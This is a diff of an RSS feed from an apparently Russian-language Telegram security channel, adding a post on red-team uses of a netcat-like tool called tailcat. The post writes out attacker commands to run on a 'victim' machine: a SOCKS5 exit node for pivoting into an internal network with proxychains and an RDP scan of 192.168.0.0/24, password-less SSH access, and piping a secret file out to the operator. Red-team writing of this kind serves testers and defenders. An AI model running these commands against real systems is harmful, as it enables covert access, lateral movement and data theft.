@@ -1,5 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0ld13r ch.</title><link>https://t.me/s0ld13r_ch</link><description>Blog about Pentest, TI/TH, OPSEC &amp; other security stuff</description><language>ru</language><lastBuildDate>Fri, 14 Aug 2026 10:37:26 +0000</lastBuildDate><item><title>Всем привет! Решил создать личный канал в Telegram!</title><link>https://t.me/s0ld13r_ch/417</link><description>Всем привет! Решил создать личный канал в Telegram!
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0ld13r ch.</title><link>https://t.me/s0ld13r_ch</link><description>Blog about Pentest, TI/TH, OPSEC &amp; other security stuff</description><language>ru</language><lastBuildDate>Mon, 31 Aug 2026 10:47:11 +0000</lastBuildDate><item><title>TailCat Red Team use case 😎</title><link>https://t.me/s0ld13r_ch/419</link><description>TailCat Red Team use case 😎
+Несколько дней назад ребята из TailScale выпустили свой инструмент tailcat, как можно понять из названия, это аналог netcat но работающий из коробки через сеть TailScale 🤩
+Первой моей мыслью стало что инструментом начнут активно пользоваться атакующие и решил расписать разные примеры применения нового "условно легитимного" софта 😃
+🔢  SOCKS5 Reverse Proxy
+Можно использовать машину жертвы как exit-node и через неё получать доступ к внутренней сети. На машине жертвы запускаем следующую команду:
+tailcat --serve=exit-node
+По умолчанию tailcat socks поднимает SOCKS5 на случайном порту и передаёт адрес и порт через переменную окружения. Чтобы не возиться с этим каждый раз, я написал небольшой wrapper под названием tcsocks, который поднимает локальный SOCKS5 на 1080 (порт можно поменять).  На машине оператора запускаем:
+tcsocks -q &lt;token&gt;
+А дальше как обычно пользуемся proxychains:
+proxychains -f proxy.conf -q nxc rdp 192.168.0.0/24
+🔢 SSH доступ без авторизации
+Tailcat также позволяет в user mode слушать SSH от пользователя, без необходимости вводить пароль, это особенно удобно если был нестабильный шелл и нужно было использовать альтернативный канал. Сперва слушаем No Auth SSH на машине жертвы:
+tailcat --serve=no-auth-ssh
+Далее подключаемся по токену с машины оператора:
+tailcat ssh &lt;token&gt;
+🔢 Эксфильтрация данных через pipe
+Ну и классика - эксфильтрация файлов через pipe на машине жертвы запускаем:
+cat secret.txt | tailcat &lt;token&gt;
+На машине оператора запускаем:
+tailcat &gt; secret.txt
+Из плюсов вижу то, что инструмент условно легитимный и работает из коробки, с открытым исходным кодом который можно кастомизировать под свои нужды 😎
+💻 tcsocks: https://gist.github.com/s0ld13rr/18e2765da1831af0a656e7bb0a819e73
+💻 tailcat: https://github.com/tailscale/tailcat
+🧢 s0ld13r
+
+[Media: Фото]</description><pubDate>Mon, 31 Aug 2026 10:47:11 +0000</pubDate><guid isPermaLink="false">telegram_s0ld13r_ch_419</guid></item><item><title>Всем привет! Решил создать личный канал в Telegram!</title><link>https://t.me/s0ld13r_ch/417</link><description>Всем привет! Решил создать личный канал в Telegram!
 Добро пожаловать!
 Идейный вдохновитель и человек, который чаще всех спрашивал, когда я уже его создам — Аскар @rockyou. Аскар, держи! 😉</description><pubDate>Fri, 14 Aug 2026 10:37:26 +0000</pubDate><guid isPermaLink="false">telegram_s0ld13r_ch_417</guid></item><item><title>Канал моего хорошего друга, рекомендую подписаться 😃</title><link>https://t.me/s0ld13r_ch/416</link><description>Канал моего хорошего друга, рекомендую подписаться 😃</description><pubDate>Fri, 14 Aug 2026 10:37:26 +0000</pubDate><guid isPermaLink="false">telegram_s0ld13r_ch_416</guid></item><item><title>В свете последних новостей про eGov, актуалочка 🤣😃</title><link>https://t.me/s0ld13r_ch/415</link><description>В свете последних новостей про eGov, актуалочка 🤣😃
 🧢 s0ld13r
